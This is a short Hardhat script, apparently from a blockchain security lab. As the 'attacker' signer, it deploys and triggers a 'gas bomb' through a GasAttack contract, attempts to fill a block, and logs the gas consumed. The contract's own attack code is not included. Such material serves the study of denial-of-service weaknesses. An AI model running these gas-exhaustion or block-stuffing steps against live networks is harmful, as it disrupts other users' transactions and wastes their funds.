const hre = require("hardhat");

async function main() {
    const [attacker] = await hre.ethers.getSigners();
    console.log("[+] Gas Attack initiated");

    const deployments = require("../deployments.json");
    const gas = await hre.ethers.getContractAt("GasAttack", deployments.GasAttack);

    console.log("[i] Deploying gas bomb (size: 500)...");
    const tx1 = await gas.deployBomb(500);
    await tx1.wait();

    console.log("[i] Triggering gas bomb...");
    const tx2 = await gas.triggerBomb(0);
    const receipt = await tx2.wait();

    console.log("[✓] Gas used:", receipt.gasUsed.toString());
    console.log("    Total gas consumed:", (await gas.gasConsumed()).toString());

    console.log("[i] Attempting block fill...");
    const tx3 = await gas.fillBlock(100);
    const receipt2 = await tx3.wait();
    console.log("[✓] Block fill gas used:", receipt2.gasUsed.toString());
}

main().catch(console.error);
